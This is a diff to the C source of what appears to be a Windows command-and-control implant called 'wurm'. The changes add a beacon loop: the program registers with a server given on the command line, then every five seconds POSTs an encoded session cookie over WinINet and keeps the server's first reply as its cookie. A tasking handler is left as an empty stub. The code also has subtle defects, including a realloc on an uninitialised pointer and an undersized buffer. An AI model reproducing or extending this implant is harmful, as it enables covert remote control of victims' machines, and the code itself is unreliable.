@@ -26,6 +26,9 @@ struct {
         char*   buffer;
         char*   length;
     } data;
+    struct {
+        int     count;
+    } beacon;
 } wurm;
 
 char* get_endpoint() {
@@ -67,55 +70,15 @@ void Register() {
     Request();
 }
 
-BOOL Request(char** cookie) {
-    HINTERNET hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
-    if (hInternet != NULL) {
-        HINTERNET hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
-        if (hConnect != NULL) {
-            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
-            if (hRequest != NULL) {
-                printf("Hello");
-                HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
-                HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
+void Beacon() {
+    wurm.http.format = "%s:%s";
+    wurm.http.status = "beacon";
+    
+    CHAR *data_to_encode = malloc(strlen(wurm.http.format)+ strlen(wurm.auth.cookie) + strlen(wurm.http.status));
+    sprintf(data_to_encode, wurm.http.format, wurm.auth.cookie, wurm.http.status);
 
-                CHAR *temp_buffer = NULL;
-                DWORD buffer_length = 0;
-                while (TRUE) {
-                    DWORD available_size = 0;
-                    DWORD download_buffer;
-                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
-                    if (!available || available_size == 0) {
-                        break;
-                    }
-                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
-                    memset(temp_buffer, 0, available_size + 1);
-
-                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
-                    if (!value || download_buffer == 0) {
-                        break;
-                    }
-                    buffer_length += download_buffer;
-                    *cookie = (CHAR*)realloc(*cookie, buffer_length + 1);
-                    sprintf_s(*cookie, buffer_length + 1, "%s\0", temp_buffer);
-                }
-
-                free(temp_buffer);
-                temp_buffer = NULL;
-
-                if (hRequest) {
-                    InternetCloseHandle(hRequest);
-                }
-                if (hConnect) {
-                    InternetCloseHandle(hConnect);
-                }
-                if (hInternet) {
-                    InternetCloseHandle(hInternet);
-                }
-            }
-        }
-    }
-    free(wurm.data.buffer);
-    return TRUE;
+    Encode(data_to_encode);
+    Request();
 }
 
 void Encode(char* data_to_encode) {
@@ -139,6 +102,70 @@ void Encode(char* data_to_encode) {
     wurm.data.length = content_length;
 }
 
+BOOL Request() {
+    printf("Beaconing...\n");
+    wurm.beacon.count += 1;
+    
+    HINTERNET hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    if (hInternet != NULL) {
+        HINTERNET hConnect = InternetConnectA(hInternet, wurm.http.address, wurm.http.port, 0, 0, INTERNET_SERVICE_HTTP, 0, 0);
+        if (hConnect != NULL) {
+            HINTERNET hRequest = HttpOpenRequestA(hConnect, "POST", wurm.http.path, 0, 0, 0, 0, 0);
+            if (hRequest != NULL) {
+                HttpAddRequestHeadersA(hRequest, wurm.data.length, -1, HTTP_ADDREQ_FLAG_ADD);
+                HttpSendRequestA(hRequest, 0, 0, wurm.data.buffer, wurm.data.size);
+
+                CHAR *temp_buffer = NULL;
+                DWORD buffer_length = 0;
+                while (TRUE) {
+                    DWORD available_size = 0;
+                    DWORD download_buffer;
+                    BOOL available = InternetQueryDataAvailable(hRequest, &available_size, 0, 0);
+                    if (!available || available_size == 0) {
+                        break;
+                    }
+                    temp_buffer = (CHAR*)realloc(temp_buffer, available_size + 1);
+                    memset(temp_buffer, 0, available_size + 1);
+
+                    BOOL value = InternetReadFile(hRequest, temp_buffer, available_size, &download_buffer);
+                    if (!value || download_buffer == 0) {
+                        break;
+                    }
+                    buffer_length += download_buffer;
+                    char* cookie = (CHAR*)realloc(cookie, buffer_length + 1);
+                    sprintf_s(cookie, buffer_length + 1, "%s\0", temp_buffer);
+
+                    if (wurm.beacon.count == 1) {
+                        wurm.auth.cookie = cookie;
+                        printf("Response:%s", wurm.auth.cookie);
+                    } else {
+                        printf("Beacon Sent");
+                    }
+                }
+
+                free(temp_buffer);
+                temp_buffer = NULL;
+
+                if (hRequest) {
+                    InternetCloseHandle(hRequest);
+                }
+                if (hConnect) {
+                    InternetCloseHandle(hConnect);
+                }
+                if (hInternet) {
+                    InternetCloseHandle(hInternet);
+                }
+            }
+        }
+    }
+    free(wurm.data.buffer);
+    return TRUE;
+}
+
+BOOL Process() {
+
+}
+
 int main(int argc, char* argv[]) {
     if (argc == 2) {
         wurm.http.address = argv[1];
@@ -160,6 +187,11 @@ int main(int argc, char* argv[]) {
     wurm.auth.cookie = NULL; 
     wurm.auth.keyword = "boondoggle";
 
-    Register(&wurm.auth.cookie);
+    Register();
+
+    while (TRUE) {
+        Beacon();
+        Sleep(5000);
+    }
 
 }
